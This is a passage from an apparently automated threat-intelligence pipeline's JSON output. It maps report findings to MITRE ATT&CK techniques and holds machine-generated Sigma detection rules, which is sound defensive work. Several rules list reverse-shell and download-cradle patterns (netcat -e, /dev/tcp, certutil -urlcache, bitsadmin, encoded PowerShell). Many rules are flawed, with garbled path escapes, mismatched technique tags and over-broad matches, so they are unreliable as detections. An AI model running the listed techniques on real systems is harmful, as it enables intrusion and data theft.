      },
      {
        "ttp_id": "64ec409c-3658-4e73-92a3-83c428acaa8e",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Process Injection",
        "attack_id": "T1055",
        "tactic": "Defense Evasion",
        "description": "Detected Process Injection activity via NLP pattern matching",
        "confidence_score": 0.636,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.214,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "sc",
          "ping",
          "at",
          "reg",
          "cmd",
          "zip",
          "net"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "136e4c3f-616a-4289-831c-f395ff448971",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Application Layer Protocol",
        "attack_id": "T1071",
        "tactic": "Command And Control",
        "description": "Detected Application Layer Protocol activity via NLP pattern matching",
        "confidence_score": 0.633,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.199,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "sc",
          "ping",
          "at",
          "reg",
          "cmd",
          "zip",
          "net"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "8f31312f-d357-4657-9402-beecd07ede9b",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Command and Scripting Interpreter",
        "attack_id": "T1059.005",
        "tactic": "Execution",
        "description": "The attacker used cmd for execution",
        "confidence_score": 0.633,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.54,
          "description_detail": 0.138,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "cmd.exe"
        ],
        "tools": [
          "sc",
          "ping",
          "cmd",
          "reg",
          "at",
          "zip",
          "net"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "00c01b51-cfd2-4221-896b-71e88a646eef",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Command and Scripting Interpreter",
        "attack_id": "T1059",
        "tactic": "Execution",
        "description": "Detected Command and Scripting Interpreter activity via NLP pattern matching",
        "confidence_score": 0.631,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.185,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "sc",
          "ping",
          "at",
          "reg",
          "cmd",
          "zip",
          "net"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "6b9f5801-2dc6-4f85-b68c-86759257f2e2",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Obfuscated Files or Information",
        "attack_id": "T1027",
        "tactic": "Defense Evasion",
        "description": "Detected Obfuscated Files or Information activity via NLP pattern matching",
        "confidence_score": 0.631,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.185,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "sc",
          "ping",
          "at",
          "reg",
          "cmd",
          "zip",
          "net"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "c7c8946c-7af2-4adb-a00d-fcf50ed48353",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Exfiltration Over C2 Channel",
        "attack_id": "T1041",
        "tactic": "Exfiltration",
        "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
        "confidence_score": 0.631,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.185,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "sc",
          "ping",
          "at",
          "reg",
          "cmd",
          "zip",
          "net"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "562aae2d-8bff-4e95-84a9-3d87b6a9ef3b",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Archive Collected Data",
        "attack_id": "T1560",
        "tactic": "Collection",
        "description": "Detected Archive Collected Data activity via NLP pattern matching",
        "confidence_score": 0.628,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.162,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "sc",
          "ping",
          "at",
          "reg",
          "cmd",
          "zip",
          "net"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "3665c5cf-3c4a-4886-a878-e0b7def78f5d",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "User Execution: Malicious File",
        "attack_id": "T1204.002",
        "tactic": "Execution",
        "description": "Detected User Execution: Malicious File activity via NLP pattern matching",
        "confidence_score": 0.621,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.5,
          "description_detail": 0.185,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "sc",
          "ping",
          "at",
          "reg",
          "cmd",
          "zip",
          "net"
        ],
        "extraction_method": "nlp_indicator"
      }
    ]
  },
  "rules": {
    "status": "success",
    "summary": {
      "ttps_processed": 30,
      "rules_generated": 30,
      "langchain_generations": 60,
      "fallback_generations": 0,
      "errors": 0,
      "processing_time_ms": 28573.387
    },
    "rule_generation_results": [
      {
        "ttp_id": "unknown",
        "technique_name": "Remote Template Injection",
        "status": "success",
        "rule": {
          "title": "Remote Template Injection via Office Documents",
          "description": "Detects remote template injection via Office documents",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_winword": {
              "Image|endswith": "\\WINWORD.EXE"
            },
            "selection_powershell": {
              "ParentImage|endswith": "\\WINWORD.EXE",
              "Image|endswith": "\\powershell.exe"
            },
            "selection_cmd": {
              "ParentImage|endswith": "\\WINWORD.EXE",
              "Image|endswith": "\\cmd.exe"
            },
            "condition": "selection_powershell or selection_cmd"
          },
          "falsepositives": [
            "Legitimate Office document editing",
            "PowerShell or command prompt usage for administrative tasks"
          ],
          "level": "high",
          "tags": [
            "attack.initial_access",
            "attack.t1566",
            "custom.remote_template_injection"
          ],
          "ttp_id": "unknown",
          "technique_name": "Remote Template Injection",
          "generation_method": "langchain",
          "id": "eb97eb4a-1bbb-45d7-96bd-b88aef560f4f"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "status": "success",
        "rule": {
          "title": "Command and Scripting Interpreter",
          "description": "Threat actor used command line tools like at, cmd, net, ping, reg for execution",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_at": {
              "Image|endswith": "\u0007t.exe"
            },
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe"
            },
            "selection_net": {
              "Image|endswith": "\net.exe"
            },
            "selection_ping": {
              "Image|endswith": "\\ping.exe"
            },
            "selection_reg": {
              "Image|endswith": "\reg.exe"
            },
            "condition": "selection_at or selection_cmd or selection_net or selection_ping or selection_reg"
          },
          "falsepositives": [
            "Administrative tasks",
            "System maintenance scripts"
          ],
          "level": "medium",
          "tags": [
            "attack.execution",
            "attack.t1569",
            "custom.mitre_command_and_scripting_interpreter"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Scripting Interpreter",
          "generation_method": "langchain",
          "id": "73fe830d-54bd-4784-a370-d3c166299243"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Phishing",
        "status": "success",
        "rule": {
          "title": "Phishing Detection via Office Process Spawning Command Shells",
          "description": "Detects potential phishing activity by identifying Office processes spawning command shells",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "ParentImage|endswith": [
                "\\WINWORD.EXE",
                "\\EXCEL.EXE",
                "\\POWERPNT.EXE"
              ],
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe"
              ]
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate office automation scripts",
            "Administrative tasks involving office applications"
          ],
          "level": "medium",
          "tags": [
            "attack.initial_access",
            "attack.t1566",
            "custom.phishing"
          ],
          "ttp_id": "unknown",
          "technique_name": "Phishing",
          "generation_method": "langchain",
          "id": "f1f8f8f5-fb91-4e48-8c59-40caffbeb91a"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "status": "success",
        "rule": {
          "title": "Obfuscated Files or Information Detection",
          "description": "Detects the use of anti-disassembly techniques, API hashing, and custom encoding to make analysis harder",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_api_hashing": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "GetCursorPos()",
                "GetTickCount()"
              ]
            },
            "selection_custom_encoding": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "C:\\Users\\user\\AppData\\Local\\Temp\\[redacted].zip"
              ]
            },
            "condition": "selection_api_hashing or selection_custom_encoding"
          },
          "falsepositives": [
            "Legitimate use of powershell for system administration",
            "Use of cmd.exe for batch scripting"
          ],
          "level": "high",
          "tags": [
            "attack.defense_evasion",
            "attack.t1564.001",
            "custom.mitre_obfuscated_files_or_information"
          ],
          "ttp_id": "unknown",
          "technique_name": "Obfuscated Files or Information",
          "generation_method": "langchain",
          "id": "4d8123db-00a6-4001-99e9-e161b3c92c9a"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Process Hollowing",
        "status": "success",
        "rule": {
          "title": "Process Hollowing via cmd.exe",
          "description": "Detects the creation of a reverse shell by executing cmd.exe in a stealthy way",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "ParentImage|endswith": "\\svchost.exe"
            },
            "selection_createprocess": {
              "Image|endswith": "\\svchost.exe",
              "CommandLine|contains": [
                "CreateProcessW",
                "CreatePipe"
              ]
            },
            "condition": "selection_cmd and selection_createprocess"
          },
          "falsepositives": [
            "Legitimate system administration tasks",
            "Software installations"
          ],
          "level": "high",
          "tags": [
            "attack.defense_evasion",
            "attack.t1566",
            "mitre.process_hollowing"
          ],
          "ttp_id": "unknown",
          "technique_name": "Process Hollowing",
          "generation_method": "langchain",
          "id": "580f86be-bffb-453b-9b7d-a6643af2ad54"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "status": "success",
        "rule": {
          "title": "Obfuscated Files or Information Detection",
          "description": "Detects the use of obfuscated files or information as part of the Defense Evasion tactic",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_obfuscated_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-enc",
                "-encod",
                "-encoded",
                "-encoding",
                "-encodings"
              ]
            },
            "selection_obfuscated_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "/c",
                "start",
                "echo",
                ">>",
                ">"
              ]
            },
            "selection_obfuscated_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "-decode",
                "-encode",
                "-urlcache"
              ]
            },
            "condition": "selection_obfuscated_powershell or selection_obfuscated_cmd or selection_obfuscated_certutil"
          },
          "falsepositives": [
            "Legitimate use of PowerShell for automation",
            "Use of cmd.exe for system administration",
            "Certutil usage for certificate management"
          ],
          "level": "medium",
          "tags": [
            "attack.defense_evasion",
            "attack.t1564.001",
            "custom.obfuscated_files_or_information"
          ],
          "ttp_id": "unknown",
          "technique_name": "Obfuscated Files or Information",
          "generation_method": "langchain",
          "id": "659a7e12-03ca-4193-a4b1-5d83c50bd7b2"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over Alternative Protocol",
        "status": "success",
        "rule": {
          "title": "Exfiltration Over Alternative Protocol",
          "description": "Detects potential exfiltration of data over alternative protocols",
          "logsource": {
            "category": "network_connection",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "DestinationIp": "redacted[.]redacted[.]com",
              "DestinationPort": 443
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate connections to the specified domain for software updates or other authorized purposes"
          ],
          "level": "high",
          "tags": [
            "attack.exfiltration",
            "attack.t1567",
            "exfiltration.over.alternative.protocol"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exfiltration Over Alternative Protocol",
          "generation_method": "langchain",
          "id": "2d788940-4f44-4698-8c59-e44cc7dcdfbf"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Spearphishing Attachment",
        "status": "success",
        "rule": {
          "title": "Spearphishing Attachment via Office Document",
          "description": "Detects spear-phishing attacks using Office documents to deliver malicious payloads",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection1": {
              "ParentImage|endswith": "\\WINWORD.EXE",
              "Image|endswith": "\\cmd.exe"
            },
            "selection2": {
              "ParentImage|endswith": "\\WINWORD.EXE",
              "Image|endswith": "\\powershell.exe"
            },
            "condition": "selection1 or selection2"
          },
          "falsepositives": [
            "Legitimate Office document editing",
            "Software installation or updates"
          ],
          "level": "high",
          "tags": [
            "attack.initial_access",
            "attack.t1566",
            "attack.spearphishing_attachment"
          ],
          "ttp_id": "unknown",
          "technique_name": "Spearphishing Attachment",
          "generation_method": "langchain",
          "id": "6449b3d3-796c-4762-8711-e01487acf989"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "File and Directory Discovery",
        "status": "success",
        "rule": {
          "title": "File and Directory Discovery via API Calls",
          "description": "Detects the use of API calls to discover files and directories on a system",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_api_calls": {
              "Image|endswith": [
                "\\explorer.exe",
                "\\cmd.exe"
              ],
              "CommandLine|contains": [
                "GetLogicalDeviceStringsW",
                "FindFirstFileA",
                "FindNextFileA"
              ]
            },
            "condition": "selection_api_calls"
          },
          "falsepositives": [
            "Legitimate system administration tasks",
            "Software installation processes"
          ],
          "level": "medium",
          "tags": [
            "attack.discovery",
            "attack.t1567",
            "custom.sigma"
          ],
          "ttp_id": "unknown",
          "technique_name": "File and Directory Discovery",
          "generation_method": "langchain",
          "id": "de8c2dff-0c1c-42e8-ade9-e2967f1c2775"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "System Information Discovery",
        "status": "success",
        "rule": {
          "title": "System Information Discovery via Directory Listing",
          "description": "Detects system information discovery via directory listing",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_dir": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "dir",
                "ls"
              ]
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Get-ChildItem",
                "ls"
              ]
            },
            "condition": "selection_dir or selection_powershell"
          },
          "falsepositives": [
            "Legitimate system administration tasks",
            "Scripted directory listings for backup or automation purposes"
          ],
          "level": "medium",
          "tags": [
            "attack.discovery",
            "attack.t1565",
            "custom.sigma"
          ],
          "ttp_id": "unknown",
          "technique_name": "System Information Discovery",
          "generation_method": "langchain",
          "id": "7bb6cebe-efb6-436e-938e-83c70c4245da"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Execution of VBA Macro Code",
        "status": "success",
        "rule": {
          "title": "Execution of VBA Macro Code",
          "description": "Detects the execution of VBA macro code, which can be used to deliver the next stage to the final payload execution",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_office": {
              "Image|endswith": [
                "\\WINWORD.EXE",
                "\\EXCEL.EXE",
                "\\POWERPNT.EXE"
              ]
            },
            "selection_macro": {
              "ParentImage|endswith": [
                "\\WINWORD.EXE",
                "\\EXCEL.EXE",
                "\\POWERPNT.EXE"
              ],
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe"
              ]
            },
            "condition": "selection_office and selection_macro"
          },
          "falsepositives": [
            "Legitimate Office macro execution",
            "Administrative tasks using Office applications"
          ],
          "level": "high",
          "tags": [
            "attack.t1204",
            "attack.execution"
          ],
          "ttp_id": "unknown",
          "technique_name": "Execution of VBA Macro Code",
          "generation_method": "langchain",
          "id": "bc4fc587-d3b5-4009-8195-1d64ea485b80"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "System Information Discovery",
        "status": "success",
        "rule": {
          "title": "System Information Discovery via API Calls",
          "description": "Detects system information discovery using GetUserNameA(), GetComputerNameA(), and GetModuleFileNameA() API calls",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_getusername": {
              "Image|endswith": "\\svchost.exe",
              "CommandLine|contains": "GetUserNameA"
            },
            "selection_getcomputername": {
              "Image|endswith": "\\svchost.exe",
              "CommandLine|contains": "GetComputerNameA"
            },
            "selection_getmodulefilename": {
              "Image|endswith": "\\svchost.exe",
              "CommandLine|contains": "GetModuleFileNameA"
            },
            "condition": "selection_getusername or selection_getcomputername or selection_getmodulefilename"
          },
          "falsepositives": [
            "Legitimate system monitoring tools",
            "Administrative scripts"
          ],
          "level": "medium",
          "tags": [
            "attack.discovery",
            "attack.t1565",
            "custom.sigma"
          ],
          "ttp_id": "unknown",
          "technique_name": "System Information Discovery",
          "generation_method": "langchain",
          "id": "7ffee057-da87-4130-9978-72eefac95747"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "status": "success",
        "rule": {
          "title": "Obfuscated Files or Information",
          "description": "Detects the use of obfuscation to hide files or information",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_obfuscation": {
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe"
              ],
              "CommandLine|contains": [
                "-enc",
                "-dec",
                "-encod",
                "-decode",
                "base64"
              ]
            },
            "selection_suspicious_activity": {
              "Image|endswith": [
                "\\certutil.exe"
              ],
              "CommandLine|contains": [
                "-encode",
                "-decode"
              ]
            },
            "condition": "selection_obfuscation or selection_suspicious_activity"
          },
          "falsepositives": [
            "Legitimate use of encoding/decoding tools",
            "Compression software"
          ],
          "level": "medium",
          "tags": [
            "attack.defense_evasion",
            "attack.t1564.001",
            "custom.obfuscated_files_or_information"
          ],
          "ttp_id": "unknown",
          "technique_name": "Obfuscated Files or Information",
          "generation_method": "langchain",
          "id": "7a4e6d28-d883-4650-be56-001e894ddf2c"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over Alternative Protocol",
        "status": "success",
        "rule": {
          "title": "Exfiltration Over Alternative Protocol",
          "description": "Detects exfiltration of data using alternative protocols",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "ftp",
                "tftp",
                "nc"
              ]
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Invoke-WebRequest",
                "-enc",
                "Out-File",
                "System.Net.WebClient"
              ]
            },
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "-decode",
                "-encode",
                "-urlcache"
              ]
            },
            "selection_bitsadmin": {
              "Image|endswith": "\bitsadmin.exe",
              "CommandLine|contains": [
                "/transfer",
                "http"
              ]
            },
            "condition": "selection_cmd or selection_powershell or selection_certutil or selection_bitsadmin"
          },
          "falsepositives": [
            "Legitimate use of command line tools for administrative tasks",
            "Use of alternative protocols for legitimate data transfer"
          ],
          "level": "high",
          "tags": [
            "attack.exfiltration",
            "attack.t1567",
            "attack.t1567.002"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exfiltration Over Alternative Protocol",
          "generation_method": "langchain",
          "id": "536d53c8-2cee-485d-ab9a-e534e7bd5852"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Data Staging",
        "status": "success",
        "rule": {
          "title": "Data Staging via System Calls",
          "description": "Detects data staging behavior through system calls",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_getadaptersinfo": {
              "Image|endswith": "\\svchost.exe",
              "CommandLine|contains": "GetAdaptersInfo"
            },
            "selection_getlogicaldevicestringsw": {
              "Image|endswith": "\\svchost.exe",
              "CommandLine|contains": "GetLogicalDeviceStringsW"
            },
            "condition": "selection_getadaptersinfo or selection_getlogicaldevicestringsw"
          },
          "falsepositives": [
            "Legitimate system calls by system services",
            "Network configuration tools"
          ],
          "level": "medium",
          "tags": [
            "attack.collection",
            "attack.t1567",
            "attack.data_staging"
          ],
          "ttp_id": "unknown",
          "technique_name": "Data Staging",
          "generation_method": "langchain",
          "id": "2ea3e985-54ef-4321-9f0a-aa979d391d10"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Masquerading",
        "status": "success",
        "rule": {
          "title": "Masquerading via Legitimate Process",
          "description": "Detects the use of legitimate processes to execute malicious code",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe"
            },
            "selection_parent_image": {
              "ParentImage|endswith": [
                "\\explorer.exe",
                "\\winlogon.exe",
                "\\services.exe"
              ]
            },
            "selection_suspicious_args": {
              "CommandLine|contains": [
                "/c",
                "/k",
                "&"
              ]
            },
            "condition": "selection_cmd and (selection_parent_image or selection_suspicious_args)"
          },
          "falsepositives": [
            "Legitimate use of cmd.exe by administrators",
            "Scripted tasks using cmd.exe"
          ],
          "level": "medium",
          "tags": [
            "attack.defense_evasion",
            "attack.t1564.003",
            "custom.masquerading",
            "custom.mitre_att&ck"
          ],
          "ttp_id": "unknown",
          "technique_name": "Masquerading",
          "generation_method": "langchain",
          "id": "a7cfe310-67be-4dc3-9220-6427e4e8de3d"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Scheduled Task",
        "status": "success",
        "rule": {
          "title": "Scheduled Task Creation via Windows Task Scheduler",
          "description": "Detects the creation of scheduled tasks via Windows Task Scheduler, which can be used for persistence by malware",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_schtasks": {
              "Image|endswith": "\\schtasks.exe",
              "CommandLine|contains": [
                "/create",
                "/tn"
              ]
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "New-ScheduledTask",
                "Register-ScheduledTask"
              ]
            },
            "condition": "selection_schtasks or selection_powershell"
          },
          "falsepositives": [
            "Legitimate system administration tasks",
            "Scheduled task creation by system services"
          ],
          "level": "medium",
          "tags": [
            "attack.persistence",
            "attack.t1560",
            "attack.scheduled_task"
          ],
          "ttp_id": "unknown",
          "technique_name": "Scheduled Task",
          "generation_method": "langchain",
          "id": "1029a380-b0b8-4d2f-aa00-929d476f25cc"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Control",
        "status": "success",
        "rule": {
          "title": "Command and Control via Hard-Coded C2 Server",
          "description": "Detects connections to hard-coded C2 servers",
          "logsource": {
            "category": "network_connection",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "DestinationIp|endswith": ".217"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "legitimate connections to servers with similar IP addresses"
          ],
          "level": "high",
          "tags": [
            "attack.command_and_control",
            "attack.t1565"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Control",
          "generation_method": "langchain",
          "id": "12f1ff28-59b2-47fa-b715-01207ed3f9f0"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Resource Development",
        "status": "success",
        "rule": {
          "title": "Resource Development Activity via Suspicious Process Creation",
          "description": "Detects potential resource development activity by identifying suspicious process creation patterns associated with downloading, executing, or registering payloads. Focuses on use of system utilities in ways commonly seen during adversary infrastructure setup.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_rundll32": {
              "Image|endswith": "\\rundll32.exe",
              "CommandLine|contains": [
                "\\\\",
                "http",
                "bitsadmin",
                "certutil",
                "Invoke-WebRequest"
              ]
            },
            "selection_regsvr32": {
              "Image|endswith": "\\regsvr32.exe",
              "CommandLine|contains": [
                "scrobj",
                "http",
                "bitsadmin",
                "certutil"
              ]
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": [
                "http",
                "/transfer"
              ]
            },
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "-urlcache",
                "-decode",
                "-verifyctl"
              ]
            },
            "selection_mshta": {
              "Image|endswith": "\\mshta.exe",
              "CommandLine|contains": [
                "http",
                "\\\\"
              ]
            },
            "selection_cscript_wscript": {
              "Image|endswith": [
                "\\cscript.exe",
                "\\wscript.exe"
              ],
              "CommandLine|contains": [
                "http",
                "\\\\"
              ]
            },
            "selection_powershell_download": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Invoke-WebRequest",
                "DownloadFile",
                "IEX",
                "-enc"
              ]
            },
            "condition": "selection_rundll32 or selection_regsvr32 or selection_bitsadmin or selection_certutil or selection_mshta or selection_cscript_wscript or selection_powershell_download"
          },
          "falsepositives": [
            "Administrative scripts using certutil or bitsadmin for legitimate software deployment",
            "Automated patch management tools downloading updates via command-line utilities",
            "Enterprise monitoring agents using script-based health checks",
            "PowerShell scripts using Invoke-WebRequest for API calls in automation workflows"
          ],
          "level": "high",
          "tags": [
            "attack.t1583",
            "attack.t1584",
            "attack.t1585",
            "attack.t1586",
            "attack.t1587",
            "attack.t1588",
            "attack.t1601",
            "attack.t1602",
            "attack.t1566",
            "attack.t1204",
            "attack.execution",
            "attack.resource-development"
          ],
          "ttp_id": "unknown",
          "technique_name": "Resource Development",
          "generation_method": "langchain",
          "id": "1a1b803f-1d3d-40b5-a17c-df120be80cf3"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Create or Modify System Process",
        "status": "success",
        "rule": {
          "title": "Reverse Shell Creation via Command Line",
          "description": "Detects the creation of a reverse shell by identifying suspicious command-line patterns commonly used to establish outbound connections to a C2 server. Focuses on known reverse shell techniques using common tools like cmd.exe, powershell.exe, and netcat-like utilities.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd_reverse": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "/c",
                "start",
                "nc",
                "ncat",
                "powershell",
                "bash",
                "sh",
                "telnet",
                "socat"
              ]
            },
            "selection_powershell_reverse": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-NoP",
                "-Exec",
                "Bypass",
                "-Enc",
                "IEX",
                "Invoke-Expression",
                "Net.Sockets.TcpClient",
                "System.Net.Sockets"
              ]
            },
            "selection_nc_netcat": {
              "CommandLine|contains": [
                "-e",
                "/bin/bash",
                "/bin/sh",
                "/c",
                "cmd"
              ],
              "CommandLine|contains|all": [
                "-e",
                " "
              ]
            },
            "selection_bash_sh": {
              "Image|endswith": [
                "\\bash",
                "\\sh"
              ],
              "CommandLine|contains": [
                "/dev/tcp",
                "exec",
                "socket",
                "nc",
                "ncat",
                "socat"
              ]
            },
            "condition": "selection_cmd_reverse or selection_powershell_reverse or selection_nc_netcat or selection_bash_sh"
          },
          "falsepositives": [
            "Legitimate system administration using remote shells or scripting tools",
            "Automated\u8fd0\u7ef4 scripts that use command-line utilities for remote management",
            "Penetration testing activities conducted by authorized teams"
          ],
          "level": "high",
          "tags": [
            "attack.t1059",
            "attack.t1505.003",
            "attack.t1071.004",
            "detection.rule.reverse_shell",
            "custom.windows",
            "custom.command_and_control"
          ],
          "ttp_id": "unknown",
          "technique_name": "Create or Modify System Process",
          "generation_method": "langchain",
          "id": "3b9ca2ea-ffd6-4211-a9ac-01f12c0d6fcc"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Data Encoding",
        "status": "success",
        "rule": {
          "title": "Data Encoding for Exfiltration via Command-Line Tools",
          "description": "Detects the use of encoding tools and techniques commonly used to encode data prior to exfiltration, focusing on command-line utilities such as certutil, PowerShell, and base64 encoding patterns.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
